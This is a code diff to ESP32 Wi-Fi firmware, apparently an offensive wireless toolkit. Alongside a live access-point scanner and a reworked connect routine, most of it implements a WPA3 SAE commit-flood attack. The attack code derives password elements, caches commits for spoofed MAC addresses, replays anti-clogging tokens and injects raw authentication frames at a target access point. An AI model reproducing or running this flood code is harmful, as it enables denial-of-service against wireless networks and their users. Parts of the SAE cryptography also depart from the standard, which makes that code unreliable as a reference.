+            // check WEP via privacy bit
+            uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
+            if (cap & 0x0010) rec->authmode = WIFI_AUTH_WEP; else rec->authmode = WIFI_AUTH_OPEN;
+        }
+    }
+
+    uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000);
+    if (now_ms - last_live_print_ms < 100) return;
+    last_live_print_ms = now_ms;
+
+    while (live_last_printed_index < ap_count) {
+        uint16_t idx = live_last_printed_index;
+        wifi_ap_record_t *rec = &scanned_aps[idx];
+        wifi_manager_print_ap_entry_formatted(idx, rec, true);
+        live_last_printed_index++;
+    }
+}
+
+void wifi_manager_start_live_ap_scan(void) {
+    ap_manager_stop_services();
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+    ESP_ERROR_CHECK(esp_wifi_start());
+    if (scanned_aps) { free(scanned_aps); scanned_aps = NULL; }
+    ap_count = 0;
+    live_last_printed_index = 0;
+    last_live_print_ms = 0;
+    wifi_manager_start_monitor_mode(live_ap_scan_callback);
+    start_live_ap_channel_hopping();
+    printf("Live AP scan started. Type 'stopscan' to stop.\n");
+    TERMINAL_VIEW_ADD_TEXT("Live AP scan started.\n");
 }
 
 esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
@@ -3119,67 +4245,83 @@ void wifi_manager_start_ip_lookup() {
 }
 
 void wifi_manager_connect_wifi(const char *ssid, const char *password) {
-    wifi_config_t wifi_config = {
-        .sta = {
-            .threshold.authmode = strlen(password) > 0 ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN,
-            .pmf_cfg = {.capable = true, .required = false},
-        },
-    };
-
+    printf("Connecting to WiFi: %s\n", ssid);
+    TERMINAL_VIEW_ADD_TEXT("Connecting to WiFi: %s\n", ssid);
+    
+    wifi_config_t wifi_config = {0};
+    
     // Copy SSID and password safely
     strlcpy((char *)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
     strlcpy((char *)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));
-
+    
+    // Set auth mode - use WPA_WPA2_PSK for better compatibility with modern routers
+    if (strlen(password) > 0) {
+        wifi_config.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
+        wifi_config.sta.pmf_cfg.capable = true;
+        wifi_config.sta.pmf_cfg.required = false;
+    } else {
+        wifi_config.sta.threshold.authmode = WIFI_AUTH_OPEN;
+    }
+    
+    // Enable scan method for better AP selection
+    wifi_config.sta.scan_method = WIFI_FAST_SCAN;
+    wifi_config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
+    
     // Ensure clean start state
-    // Clear connection bits first
     xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT | WIFI_CONNECTING_BIT);
     
-    // Set the connecting bit BEFORE any WiFi operations to prevent automatic connection attempts
+    // Set the connecting bit BEFORE any WiFi operations
     xEventGroupSetBits(wifi_event_group, WIFI_CONNECTING_BIT);
     
-    // Disconnect any existing connection and wait for it to complete
-    esp_wifi_disconnect();
-    // Wait a bit for the disconnection to be processed
-    vTaskDelay(pdMS_TO_TICKS(500));
+    // Stop WiFi completely to ensure clean state
+    esp_wifi_stop();
+    vTaskDelay(pdMS_TO_TICKS(100));
     
+    // Reconfigure and restart WiFi
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
     ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config));
     ESP_ERROR_CHECK(esp_wifi_start());
+    
+    // Wait for WiFi to be ready
+    vTaskDelay(pdMS_TO_TICKS(1000));
 
     int retry_count = 0;
-    const int max_retries = 8;  // Increased retry count
+    const int max_retries = 5;  // Reduced retry count for cleaner logs
     bool connected = false;
 
     while (retry_count < max_retries && !connected) {
+        if (retry_count > 0) {
+            printf("Retry attempt %d/%d...\n", retry_count, max_retries);
+            TERMINAL_VIEW_ADD_TEXT("Retry attempt %d/%d...\n", retry_count, max_retries);
+        }
+        
         esp_err_t ret = esp_wifi_connect();
         if (ret == ESP_ERR_WIFI_CONN) {
             ret = ESP_OK; // Already connecting, handled elsewhere
         }
 
         if (ret == ESP_OK) {
-            // Increased timeout to 15 seconds for better reliability
+            // Wait for connection with timeout
             EventBits_t bits = xEventGroupWaitBits(wifi_event_group, 
-                WIFI_CONNECTED_BIT, pdFALSE, pdTRUE, pdMS_TO_TICKS(15000));
+                WIFI_CONNECTED_BIT, pdFALSE, pdTRUE, pdMS_TO_TICKS(10000));
             
             if (bits & WIFI_CONNECTED_BIT) {
                 connected = true;
-                TERMINAL_VIEW_ADD_TEXT("Connected to %s\n", ssid);
-                printf("Connected to %s\n", ssid);
+                printf("Successfully connected to %s\n", ssid);
+                TERMINAL_VIEW_ADD_TEXT("Successfully connected to %s\n", ssid);
                 break;
-            } else {
-                TERMINAL_VIEW_ADD_TEXT("Timeout connecting to %s (attempt %d/%d)\n", ssid, retry_count+1, max_retries);
-                printf("Timeout connecting to %s (attempt %d/%d)\n", ssid, retry_count+1, max_retries);
             }
         } else {
-            TERMINAL_VIEW_ADD_TEXT("Failed to initiate connection to %s (error: %d) (attempt %d/%d)\n", ssid, ret, retry_count+1, max_retries);
-            printf("Failed to initiate connection to %s (error: %d) (attempt %d/%d)\n", ssid, ret, retry_count+1, max_retries);
+            printf("Connection initiation failed (error: %d)\n", ret);
+            TERMINAL_VIEW_ADD_TEXT("Connection initiation failed (error: %d)\n", ret);
         }
 
         if (!connected) {
             esp_wifi_disconnect();
-            // Increased delay between retries to prevent overwhelming the AP
-            vTaskDelay(pdMS_TO_TICKS(2000));
             retry_count++;
+            if (retry_count < max_retries) {
+                vTaskDelay(pdMS_TO_TICKS(3000)); // 3 second delay between retries
+            }
         }
     }
 
@@ -3470,7 +4612,7 @@ void wifi_manager_scanall_chart() {
     }
 
     printf("\n--- Combined AP and Station Scan Results ---\n\n");
-    TERMINAL_VIEW_ADD_TEXT("\n--- Combined AP/STA Scan Results ---\n\n");
+    TERMINAL_VIEW_ADD_TEXT("\n--- Combined AP and Station Scan Results ---\n\n");
 
     const char* ap_header_top =    "┌──────────────────────────────────┬───────────────────┬──────┬───────────┐";
     const char* ap_header_mid =    "│ SSID                             │ BSSID             │ Chan │ Company   │";
@@ -3911,111 +5053,527 @@ static int sae_flood_packets_sent = 0;
 static uint8_t sae_target_bssid[6];
 static int sae_target_channel = 1;
 static int sae_injection_rate = 25;
+// Limit the number of unique spoofed MACs to reduce crypto context thrash
+#define SAE_MAC_POOL_SIZE 8
+#define SAE_PRECOMPUTE_LIMIT 8
+static uint8_t sae_mac_pool[SAE_MAC_POOL_SIZE][6];
+static bool sae_mac_pool_ready = false;
+// Number of frames to send per MAC before switching to the next one
+static int sae_frames_per_mac = 32;
+// Cached commit data per MAC
+// Element is 32-byte X coordinate for P-256 (SAE commit encoding)
+static uint8_t sae_commit_element_cache[SAE_MAC_POOL_SIZE][33];
+static uint8_t sae_commit_scalar_cache[SAE_MAC_POOL_SIZE][32];
+static bool sae_commit_cache_ready[SAE_MAC_POOL_SIZE];
+static bool sae_precompute_attempted[SAE_MAC_POOL_SIZE];
+static uint16_t sae_seq_counters[SAE_MAC_POOL_SIZE];
+static uint32_t sae_cache_hits = 0;
+static uint32_t sae_cache_misses = 0;
+static uint32_t sae_pwe_failures = 0;
+static uint32_t sae_token_rx = 0;
+static uint32_t sae_commit_tx_ok = 0;
+static uint32_t sae_commit_tx_err = 0;
+static uint32_t sae_status76_rx = 0;
+static uint32_t sae_status0_rx = 0;
+// Track which spoofed MAC the anti-clogging token belongs to
+static uint8_t sae_token_mac[6];
+static bool sae_token_mac_valid = false;
 
-// SAE Commit frame template (simplified for ESP32)
-static const uint8_t SAE_COMMIT_TEMPLATE[] = {
-    // 802.11 Authentication frame header
-    0xb0, 0x00,                     // Frame Control (Authentication)
-    0x00, 0x00,                     // Duration
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (will be filled)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be filled)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be filled)
-    0x00, 0x00,                     // Sequence Control
-    
-    // Authentication frame body
-    0x03, 0x00,                     // Algorithm (SAE = 3)
-    0x01, 0x00,                     // Transaction Sequence (Commit = 1)
-    0x00, 0x00,                     // Status Code (Success = 0)
-    0x13, 0x00,                     // Group ID (19 = P-256)
-    
-    // Simplified scalar (32 bytes for P-256)
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
-    0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
-    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
-    0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
-    
-    // Simplified element (64 bytes for P-256 - X and Y coordinates)
-    0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
-    0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30,
-    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
-    0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40,
-    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
-    0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50,
-    0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
-    0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60
-};
+// SAE protocol state and variables
+typedef struct {
+    uint8_t peer_mac[6];
+    uint8_t own_mac[6];
+    uint8_t bssid[6];
+    char password[64];
+    mbedtls_ecp_group group;
+    mbedtls_ecp_point pwe;          // Password Element
+    mbedtls_ecp_point peer_element;
+    mbedtls_ecp_point own_element;
+    mbedtls_mpi peer_scalar;
+    mbedtls_mpi own_scalar;
+    mbedtls_mpi rand;
+    mbedtls_mpi mask;
+    uint8_t kck[32];
+    uint8_t pmk[32];
+    uint8_t token[32];
+    uint16_t token_len;
+    bool token_required;
+    int sync;
+    int rc;
+} sae_data_t;
 
-static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
-    uint8_t frame[sizeof(SAE_COMMIT_TEMPLATE)];
-    memcpy(frame, SAE_COMMIT_TEMPLATE, sizeof(SAE_COMMIT_TEMPLATE));
+static sae_data_t sae_ctx;
+static bool sae_initialized = false;
+static portMUX_TYPE sae_lock = portMUX_INITIALIZER_UNLOCKED;
+
+// Forward declarations
+static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac, const uint8_t *peer_mac, const char *ssid);
+static esp_err_t sae_generate_commit(sae_data_t *sae);
+
+/**
+ * Derive Password-to-Element (PWE) using hunt-and-peck method
+ * Based on IEEE 802.11-2016 Section 12.4.4.2.2
+ */
+// Static buffers to reduce stack usage
+static uint8_t sae_pwd_seed[128];
+static uint8_t sae_pwd_value[32];
+
+// Static mbedTLS contexts to reduce stack usage
+static mbedtls_entropy_context sae_entropy;
+static mbedtls_ctr_drbg_context sae_ctr_drbg;
+static mbedtls_sha256_context sae_sha256;
+static mbedtls_ecp_point sae_tmp_point;
+static bool sae_crypto_initialized = false;
+
+static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1, 
+                                const uint8_t *addr2, const char *ssid,
+                                mbedtls_ecp_point *pwe, mbedtls_ecp_group *group) {
+    mbedtls_mpi x, y, tmp;
+    int counter = 1;
+    bool found = false;
+    (void)ssid;
+    ESP_LOGI("SAE_PWE", "derive start");
     
-    // Fill in MAC addresses
-    memcpy(frame + 4, sae_target_bssid, 6);   // Destination (AP)
-    memcpy(frame + 10, src_mac, 6);           // Source (spoofed client)
-    memcpy(frame + 16, sae_target_bssid, 6);  // BSSID
+    mbedtls_mpi_init(&x); mbedtls_mpi_init(&y); mbedtls_mpi_init(&tmp);
+    mbedtls_sha256_init(&sae_sha256);
     
-    // Randomize scalar and element to create unique frames
-    for (int i = 32; i < sizeof(SAE_COMMIT_TEMPLATE); i++) {
-        frame[i] = esp_random() & 0xFF;
+    // Hunt-and-peck to find valid point
+    while (!found && counter <= 40) {
+        // Create pwd-seed = max(addr1, addr2) || min(addr1, addr2) || password || counter
+        int pos = 0;
+        if (memcmp(addr1, addr2, 6) > 0) {
+            memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
+            memcpy(sae_pwd_seed + pos, addr2, 6); pos += 6;
+        } else {
+            memcpy(sae_pwd_seed + pos, addr2, 6); pos += 6;
+            memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
+        }
+        
+        int pwd_len = strlen(password);
+        memcpy(sae_pwd_seed + pos, password, pwd_len);
+        pos += pwd_len;
+        sae_pwd_seed[pos++] = counter;
+        
+        // pwd-value = SHA-256(pwd-seed)
+        mbedtls_sha256_starts(&sae_sha256, 0);
+        mbedtls_sha256_update(&sae_sha256, sae_pwd_seed, pos);
+        mbedtls_sha256_finish(&sae_sha256, sae_pwd_value);
+        
+        // Convert to x coordinate
+        mbedtls_mpi_read_binary(&x, sae_pwd_value, 32);
+        mbedtls_mpi_mod_mpi(&x, &x, &group->P);
+        
+        // Check if x^3 + a*x + b is quadratic residue and try both parities
+        mbedtls_mpi_mul_mpi(&tmp, &x, &x);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        mbedtls_mpi_mul_mpi(&tmp, &tmp, &x);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        mbedtls_mpi_mul_mpi(&y, &group->A, &x);
+        mbedtls_mpi_mod_mpi(&y, &y, &group->P);
+        mbedtls_mpi_add_mpi(&tmp, &tmp, &y);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        mbedtls_mpi_add_mpi(&tmp, &tmp, &group->B);
+        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
+        
+        uint8_t point_buf[33];
+        memcpy(point_buf + 1, sae_pwd_value, 32);
+        point_buf[0] = 0x02;
+        if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
+            found = true;
+        } else {
+            point_buf[0] = 0x03;
+        if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
+            found = true;
+        } else {
+            counter++;
+            }
+        }
     }
     
-    // Add some randomization to sequence control for better variation
-    uint16_t seq = (esp_random() & 0xFFF0) | (frame_counter & 0x000F);
-    frame[22] = seq & 0xFF;
-    frame[23] = (seq >> 8) & 0xFF;
+    mbedtls_mpi_free(&x); mbedtls_mpi_free(&y); mbedtls_mpi_free(&tmp);
+    mbedtls_sha256_free(&sae_sha256);
+    ESP_LOGI("SAE_PWE", "derive %s", found ? "ok" : "fail");
     
-    // Vary the Group ID occasionally for more diversity
-    if ((frame_counter % 50) == 0) {
-        uint16_t group_ids[] = {19, 20, 21}; // P-256, P-384, P-521
-        uint16_t group_id = group_ids[esp_random() % 3];
-        frame[30] = group_id & 0xFF;
-        frame[31] = (group_id >> 8) & 0xFF;
+    return found ? ESP_OK : ESP_FAIL;
+}
+
+/**
+ * Generate SAE commit scalar and element
+ */
+static esp_err_t sae_generate_commit(sae_data_t *sae) {
+    ESP_LOGI("SAE_COMMIT", "gen start");
+    // Initialize crypto contexts once
+    if (!sae_crypto_initialized) {
+        mbedtls_entropy_init(&sae_entropy);
+        mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+        mbedtls_ecp_point_init(&sae_tmp_point);
+        if (mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0) != 0) {
+            ESP_LOGI("SAE_COMMIT", "drbg seed fail");
+            return ESP_FAIL;
+        }
+        sae_crypto_initialized = true;
     }
     
-    // Inject the frame
-    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-    sae_flood_packets_sent++;
+    // Generate random scalar and mask
+    mbedtls_mpi_fill_random(&sae->rand, 32, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
+    mbedtls_mpi_fill_random(&sae->mask, 32, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
+    
+    // scalar = (rand + mask) mod order
+    mbedtls_mpi_add_mpi(&sae->own_scalar, &sae->rand, &sae->mask);
+    mbedtls_mpi_mod_mpi(&sae->own_scalar, &sae->own_scalar, &sae->group.N);
+    if (mbedtls_mpi_cmp_int(&sae->own_scalar, 0) == 0) {
+        mbedtls_mpi_lset(&sae->own_scalar, 1);
+    }
+    // own_element = (N - (mask mod N)) * PWE  [equivalent to -(mask * PWE) mod N]
+    {
+        mbedtls_mpi mask_mod, mask_neg;
+        mbedtls_mpi_init(&mask_mod);
+        mbedtls_mpi_init(&mask_neg);
+        mbedtls_mpi_mod_mpi(&mask_mod, &sae->mask, &sae->group.N);
+        if (mbedtls_mpi_cmp_int(&mask_mod, 0) == 0) {
+            mbedtls_mpi_lset(&mask_mod, 1);
+        }
+        mbedtls_mpi_sub_mpi(&mask_neg, &sae->group.N, &mask_mod);
+        if (mbedtls_mpi_cmp_int(&mask_neg, 0) == 0) {
+            mbedtls_mpi_lset(&mask_neg, 1);
+        }
+        if (mbedtls_ecp_mul(&sae->group, &sae->own_element, &mask_neg, &sae->pwe,
+                            mbedtls_ctr_drbg_random, &sae_ctr_drbg) != 0) {
+            mbedtls_mpi_free(&mask_mod);
+            mbedtls_mpi_free(&mask_neg);
+            return ESP_FAIL;
+        }
+        mbedtls_mpi_free(&mask_mod);
+        mbedtls_mpi_free(&mask_neg);
+    }
+    ESP_LOGI("SAE_COMMIT", "gen ok");
+    return ESP_OK;
+}
+
+/**
+ * Calculate SAE confirm value
+ */
+static esp_err_t sae_calculate_confirm(sae_data_t *sae, uint16_t send_confirm, uint8_t *confirm) {
+    int ret;
+    mbedtls_ecp_point_init(&sae_tmp_point);
+
+    // Compute shared secret: own_scalar * peer_element
+    ret = mbedtls_ecp_mul(&sae->group, &sae_tmp_point, &sae->own_scalar,
+                          &sae->peer_element, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
+    if (ret != 0) goto cleanup;
+
+    // Extract X coordinate (big-endian, 32 bytes) as K
+    uint8_t k[33];
+    size_t olen;
+    mbedtls_ecp_point_write_binary(&sae->group, &sae_tmp_point,
+                                   MBEDTLS_ECP_PF_COMPRESSED, &olen,
+                                   k, sizeof(k));
+    // Skip compression byte by shifting buffer
+    uint8_t *kptr = k + 1;
+
+    // Confirm = SHA256(be16(send_confirm) || K)
+    mbedtls_sha256_init(&sae_sha256);
+    mbedtls_sha256_starts(&sae_sha256, 0);
+    uint8_t sc_be[2] = { (uint8_t)(send_confirm & 0xFF), (uint8_t)((send_confirm >> 8) & 0xFF) };
+    uint8_t tmp_swap = sc_be[0]; sc_be[0] = sc_be[1]; sc_be[1] = tmp_swap;
+    mbedtls_sha256_update(&sae_sha256, sc_be, sizeof(sc_be));
+    mbedtls_sha256_update(&sae_sha256, kptr, 32);
+    mbedtls_sha256_finish(&sae_sha256, confirm);
+    mbedtls_sha256_free(&sae_sha256);
+    
+cleanup:
+    mbedtls_ecp_point_free(&sae_tmp_point);
+    return (ret == 0 ? ESP_OK : ESP_FAIL);
+}
+
+/**
+ * Initialize SAE context with proper PWE derivation
+ */
+static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac,
+                                  const uint8_t *peer_mac, const char *ssid) {
+    // Reuse if already initialized for the same MAC tuple
+    if (sae_initialized &&
+        memcmp(sae_ctx.own_mac, own_mac, 6) == 0 &&
+        memcmp(sae_ctx.peer_mac, peer_mac, 6) == 0) {
+        return ESP_OK;
+    }
+
+    if (!sae_initialized) {
+        memset(&sae_ctx, 0, sizeof(sae_ctx));
+        mbedtls_ecp_group_init(&sae_ctx.group);
+        mbedtls_ecp_point_init(&sae_ctx.pwe);
+        mbedtls_ecp_point_init(&sae_ctx.peer_element);
+        mbedtls_ecp_point_init(&sae_ctx.own_element);
+        mbedtls_mpi_init(&sae_ctx.peer_scalar);
+        mbedtls_mpi_init(&sae_ctx.own_scalar);
+        mbedtls_mpi_init(&sae_ctx.rand);
+        mbedtls_mpi_init(&sae_ctx.mask);
+        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            return ESP_FAIL;
+        }
+        sae_initialized = true;
+    }
+
+    strncpy(sae_ctx.password, password, sizeof(sae_ctx.password) - 1);
+    memcpy(sae_ctx.own_mac, own_mac, 6);
+    memcpy(sae_ctx.peer_mac, peer_mac, 6);
+    memcpy(sae_ctx.bssid, peer_mac, 6);
+    
+    // Derive PWE with the provided MAC addresses
+    if (sae_derive_pwe(password, own_mac, peer_mac, ssid, &sae_ctx.pwe, &sae_ctx.group) != ESP_OK) {
+        return ESP_FAIL;
+    }
+    
+    return ESP_OK;
+}
+
+// Static frame buffer to reduce stack usage
+static uint8_t sae_frame_buffer[512];
+
+static char sae_flood_password_buf[64];
+
+static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
+    int frame_len = 0;
+    bool token_required_local = false;
+    uint16_t token_len_local = 0;
+    uint8_t token_buf_local[128];
+    
+    // 802.11 Authentication header
+    sae_frame_buffer[0] = 0xb0; sae_frame_buffer[1] = 0x00;  // Frame Control
+    sae_frame_buffer[2] = 0x00; sae_frame_buffer[3] = 0x00;  // Duration
+    // Addresses: DA, SA, BSSID
+    memcpy(sae_frame_buffer + 4, sae_target_bssid, 6);
+    memcpy(sae_frame_buffer + 10, src_mac, 6);
+    memcpy(sae_frame_buffer + 16, sae_target_bssid, 6);
+    // Sequence Control: fragment number = 0, 12-bit seq number random
+    uint16_t seq = esp_random() & 0x0FFF;
+    sae_frame_buffer[22] = (seq << 4) & 0xF0;
+    sae_frame_buffer[23] = (seq >> 4) & 0xFF;
+    frame_len = 24;
+    
+    // Auth Algorithm = SAE (3), Sequence = Commit (1), Status = 0
+    sae_frame_buffer[frame_len++] = 0x03; sae_frame_buffer[frame_len++] = 0x00;  // Algorithm
+    sae_frame_buffer[frame_len++] = 0x01; sae_frame_buffer[frame_len++] = 0x00;  // Transaction
+    sae_frame_buffer[frame_len++] = 0x00; sae_frame_buffer[frame_len++] = 0x00;  // Status
+    
+    // Group ID = P-256 (19)
+    sae_frame_buffer[frame_len++] = 0x13; sae_frame_buffer[frame_len++] = 0x00;
+    
+    // Read anti-clogging token if required (write it later after scalar+element)
+    portENTER_CRITICAL(&sae_lock);
+    token_required_local = sae_ctx.token_required;
+    token_len_local = sae_ctx.token_len;
+    if (token_required_local && token_len_local > 0) {
+        if (token_len_local > sizeof(token_buf_local)) token_len_local = sizeof(token_buf_local);
+        memcpy(token_buf_local, sae_ctx.token, token_len_local);
+    }
+    portEXIT_CRITICAL(&sae_lock);
+    ESP_LOGI("SAE_TX", "commit hdr ok, token=%d len=%u", token_required_local, (unsigned)token_len_local);
+    
+    // Initialize base crypto once
+    static const char *sae_flood_password = NULL;
+    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
+    const char *ssid = NULL;
+    if (!sae_crypto_initialized) {
+        mbedtls_entropy_init(&sae_entropy);
+        mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+        mbedtls_ecp_point_init(&sae_tmp_point);
+        mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
+        sae_crypto_initialized = true;
+    }
+    if (!sae_initialized) {
+        mbedtls_ecp_group_init(&sae_ctx.group);
+        mbedtls_ecp_point_init(&sae_ctx.pwe);
+        mbedtls_ecp_point_init(&sae_ctx.peer_element);
+        mbedtls_ecp_point_init(&sae_ctx.own_element);
+        mbedtls_mpi_init(&sae_ctx.peer_scalar);
+        mbedtls_mpi_init(&sae_ctx.own_scalar);
+        mbedtls_mpi_init(&sae_ctx.rand);
+        mbedtls_mpi_init(&sae_ctx.mask);
+        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            return ESP_FAIL;
+        }
+        sae_initialized = true;
+    }
+
+    // Use cached commit for this MAC if available
+    int pool_idx = -1;
+    if (sae_mac_pool_ready) {
+        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+            if (memcmp(sae_mac_pool[i], src_mac, 6) == 0) { pool_idx = i; break; }
+        }
+    }
+    bool used_cache = false;
+    if (pool_idx >= 0 && pwd && strlen(pwd) > 0 && sae_commit_cache_ready[pool_idx]) {
+        portENTER_CRITICAL(&sae_lock);
+        memcpy(sae_ctx.own_mac, src_mac, 6);
+        memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
+        memcpy(sae_ctx.bssid, sae_target_bssid, 6);
+        mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[pool_idx], 32);
+        portEXIT_CRITICAL(&sae_lock);
+        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
+            return ESP_ERR_NO_MEM;
+        }
+        memcpy(sae_frame_buffer + frame_len, sae_commit_scalar_cache[pool_idx], 32);
+        frame_len += 32;
+        memcpy(sae_frame_buffer + frame_len, sae_commit_element_cache[pool_idx] + 1, 32);
+        frame_len += 32;
+        used_cache = true;
+        sae_cache_hits++;
+        ESP_LOGI("SAE_TX", "cache hit idx=%d", pool_idx);
+    } else {
+        // Fall back to on-demand derivation/generation when no cache; require password/PWE
+        if (!(pwd && strlen(pwd) > 0)) return ESP_FAIL;
+        if (sae_init_context(pwd, src_mac, sae_target_bssid, ssid) != ESP_OK ||
+            sae_generate_commit(&sae_ctx) != ESP_OK) {
+            mbedtls_ecp_group_free(&sae_ctx.group);
+            mbedtls_ecp_point_free(&sae_ctx.pwe);
+            mbedtls_ecp_point_free(&sae_ctx.peer_element);
+            mbedtls_ecp_point_free(&sae_ctx.own_element);
+            mbedtls_mpi_free(&sae_ctx.peer_scalar);
+            mbedtls_mpi_free(&sae_ctx.own_scalar);
+            mbedtls_mpi_free(&sae_ctx.rand);
+            mbedtls_mpi_free(&sae_ctx.mask);
+            memset(&sae_ctx, 0, sizeof(sae_ctx));
+            sae_initialized = false;
+                return ESP_FAIL;
+            }
+        sae_cache_misses++;
+        ESP_LOGI("SAE_TX", "cache miss derive ok");
+    }
+    
+    if (!used_cache) {
+        // Element: 32-byte X coordinate of own_element
+        uint8_t element_x[32];
+        size_t elen = 0;
+        uint8_t element_buf[33];
+        if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
+                                           MBEDTLS_ECP_PF_COMPRESSED, &elen,
+                                           element_buf, sizeof(element_buf)) != 0 || elen < 33) {
+            return ESP_FAIL;
+        }
+        memcpy(element_x, element_buf + 1, 32);
+        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
+            return ESP_ERR_NO_MEM;
+        }
+        // Scalar (32 bytes)
+        mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
+        frame_len += 32;
+        memcpy(sae_frame_buffer + frame_len, element_x, 32);
+        frame_len += 32;
+    }
+    ESP_LOGI("SAE_TX", "frm len=%d", frame_len);
+
+    // Append anti-clogging token (after scalar + element)
+    if (token_required_local && token_len_local > 0) {
+        size_t remaining = sizeof(sae_frame_buffer) - frame_len;
+        if ((size_t)token_len_local > remaining) token_len_local = (uint16_t)remaining;
+        if (token_len_local > 0) {
+            memcpy(sae_frame_buffer + frame_len, token_buf_local, token_len_local);
+            frame_len += token_len_local;
+        }
+    }
+    
+    // Transmit commit frame
+    // Maintain a per-MAC seq counter to keep auth seq control more stable
+    if (pool_idx >= 0) {
+        uint16_t s = ++sae_seq_counters[pool_idx] & 0x0FFF;
+        sae_frame_buffer[22] = (s << 4) & 0xF0;
+        sae_frame_buffer[23] = (s >> 4) & 0xFF;
+    }
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, sae_frame_buffer, frame_len, false);
+    if (err == ESP_OK) {
+        sae_flood_packets_sent++;
+        sae_commit_tx_ok++;
+        ESP_LOGI("SAE_TX", "tx ok");
+    } else {
+        ESP_LOGE("SAE_FLOOD", "SAE commit injection failed: %s", esp_err_to_name(err));
+        sae_commit_tx_err++;
+    }
+    return err;
 }
 
 static void sae_flood_task(void *param) {
     uint8_t spoofed_mac[6];
     uint8_t base_mac[6];
     int frame_counter = 0;
+    int backoff_ms = 0;
+    int consecutive_no_mem = 0;
+    int rate_scale_pct = 100;
+    int success_streak = 0;
     
     // Get base MAC address
     esp_wifi_get_mac(WIFI_IF_STA, base_mac);
     
-    printf("SAE flood attack started on channel %d\n", sae_target_channel);
-    TERMINAL_VIEW_ADD_TEXT("SAE flood attack started on channel %d\n", sae_target_channel);
-    printf("Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+    printf("SAE flood started on ch %d\n", sae_target_channel);
+    printf("Target: %02x:%02x:%02x:%02x:%02x:%02x\n", 
            sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
            sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
-    TERMINAL_VIEW_ADD_TEXT("Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", 
-                          sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
-                          sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
-    printf("Injection rate: %d frames/second\n", sae_injection_rate);
-    TERMINAL_VIEW_ADD_TEXT("Injection rate: %d frames/second\n", sae_injection_rate);
+    printf("Rate: %d fps\n", sae_injection_rate);
     
     while (sae_flood_running) {
-        // Generate spoofed MAC address
-        memcpy(spoofed_mac, base_mac, 6);
